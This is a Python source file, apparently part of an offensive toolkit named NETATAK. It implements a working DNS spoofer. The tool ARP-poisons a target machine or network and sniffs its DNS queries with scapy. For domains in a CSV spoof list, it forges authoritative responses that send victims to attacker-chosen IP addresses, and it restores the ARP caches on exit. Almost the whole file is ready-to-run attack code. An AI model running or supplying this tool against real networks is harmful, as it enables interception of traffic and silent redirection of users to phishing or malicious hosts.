"""
Copyright (C) 2020 Tyrone Westall

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.
"""

# DNS Spoofer
# This tool will start by conducting an ARP MITM against the target machine/network.
# It will then attempt to intercept and inspect the DNS queries from the target/network.
# If the target is attempting to access a site that is in the spoof list, the packet will be modified and
# returned to the target, sending them to the configured page. Otherwise, the target will be forwarded to
# the legitimate location.
# The spoof list can be found at atktools/config/dnspoof/spooflist.csv

import csv
import multiprocessing
import sys
import time
from pathlib import Path
from scapy.all import DNS, DNSRR, IP, UDP, send, sniff
from atktools import arp_mitm

# Define text colours
B, R, Y, G, N = '\033[1;34m', '\033[1;31m', '\033[1;33m', '\033[1;32m', '\033[1;37m'


# Define the class
class dnspoof:
    def __init__(self, target, rtrip, atkopt, timeout=10, pktintr=0.1):
        # netscanner/MITM variables
        self.target = target  # Target machine/network
        self.rtrip = rtrip  # Default gateway for the network
        self.atkopt = atkopt  # 0 = Start MITM, 1 = Stop MITM
        self.timeout = timeout  # Response timeout value
        self.pktintr = float(pktintr)  # Interval between packets

        # Config file - the CSV spoof list of domain,ip pairs
        self.dnspoof_config = Path(__file__).resolve().parent / "config" / "dnspoof" / "spooflist.csv"

        # Spoof list is loaded once into memory as {domain: ip} rather than re-read per packet
        self.spooflist = self.load_spooflist()

    def load_spooflist(self):
        # Read the spoof list once and return a {domain: ip} mapping.
        # Domains are normalised (lower-cased, trailing dot stripped) so they can be
        # compared directly against intercepted DNS query names.
        spooflist = {}
        try:
            with open(self.dnspoof_config, 'r') as conf_reader:
                for row in csv.reader(conf_reader, delimiter=","):
                    if len(row) < 2:
                        continue  # Skip blank lines or malformed rows
                    domain = row[0].strip().rstrip('.').lower()
                    ip = row[1].strip()
                    if domain and ip:
                        spooflist[domain] = ip
        except FileNotFoundError:
            print("{0}[*] Error: spoof list not found at {1}".format(R, self.dnspoof_config))
        if not spooflist:
            print("{0}[*] Warning: the spoof list is empty - no DNS queries will be spoofed.".format(Y))
        return spooflist

    def lookup_spoof_ip(self, qname):
        # Return the spoof IP for a query name, or None if it is not in the list.
        # Match on the exact domain or any of its parent domains so that, e.g., an
        # entry for "example.com" also covers "www.example.com" without matching
        # unrelated names that merely contain the string (e.g. "notexample.com").
        qname = qname.rstrip('.').lower()
        labels = qname.split('.')
        for i in range(len(labels)):
            candidate = '.'.join(labels[i:])
            if candidate in self.spooflist:
                return self.spooflist[candidate]
        return None

    def parse_pkt(self, pkt):
        if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
            pkt_dst = pkt[DNS].qd.qname.decode("utf-8")
            print("{0}[*] Intercepted DNS query from {1} attempting to locate {2}".format(Y, pkt[IP].src, pkt_dst))
            rdata_ip = self.lookup_spoof_ip(pkt_dst)
            if rdata_ip is None:
                return  # Not in the spoof list - let it resolve legitimately
            pkt_response = (IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                            UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /
                            DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1,
                                an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=rdata_ip)))
            send(pkt_response, verbose=0)
            print("{0}[*] Spoofed DNS response sent. {1} has been pointed to {2} for {3}".format(G, pkt[IP].src, rdata_ip, pkt_dst))

    def sniff_packets(self):
        # Use Scapy's sniff feature to sniff out any DNS requests from the target machine/network
        sniff_filter = "udp and port 53 and ip src %s" % self.target
        sniff(filter=sniff_filter, prn=self.parse_pkt)

    def restore_network(self):
        # Restore the target/router ARP caches and turn IP forwarding back off so the
        # network is left exactly as it was found. Safe to call more than once.
        try:
            arp_mitm.arp_mitm(self.target, self.rtrip, 1, self.timeout, self.pktintr, verbose=0).find_targets()
        except Exception as restore_error:
            print("{0}[*] Warning: failed to restore the network cleanly: {1}".format(R, restore_error))

    def start_spoofer(self):
        arp_thread = None
        spoof_thread = None
        try:
            print("{0}[*] NETATAK is starting ARP poisoning against {1}. Going to sleep for 15 seconds whilst this operation completes...".format(B, self.target))
            arp_start = arp_mitm.arp_mitm(self.target, self.rtrip, 0, self.timeout, self.pktintr)
            arp_thread = multiprocessing.Process(target=arp_start.find_targets)
            arp_thread.start()
            time.sleep(15)

            # arp_mitm.find_targets() already re-poisons the caches every 15 seconds,
            # so a single background process keeps the MITM alive for the whole session.
            spoof_thread = multiprocessing.Process(target=self.sniff_packets)
            spoof_thread.start()
            print("{0}[*] NETATAK is now spoofing responses to DNS queries for {1}. Press CTRL+C to stop spoofing DNS responses and ARP poisoning.".format(B, self.target))

            # Wait for the sniffer to run until the user interrupts.
            spoof_thread.join()
        except KeyboardInterrupt:
            print("{0}[*] NETATAK is now stopping DNS Spoofing against {1}".format(B, self.target))
        except Exception:
            print("{0}[*] NETATAK encountered an unexpected error whilst trying to conduct DNS spoofing. The error is: {1}.".format(R, sys.exc_info()[0]))
        finally:
            # Always stop both background processes and put the network back as it was.
            for thread in (spoof_thread, arp_thread):
                if thread is not None and thread.is_alive():
                    thread.terminate()
                    thread.join()
            print("{0}[*] NETATAK is now restoring the network and stopping ARP poisoning against {1}".format(B, self.target))
            self.restore_network()
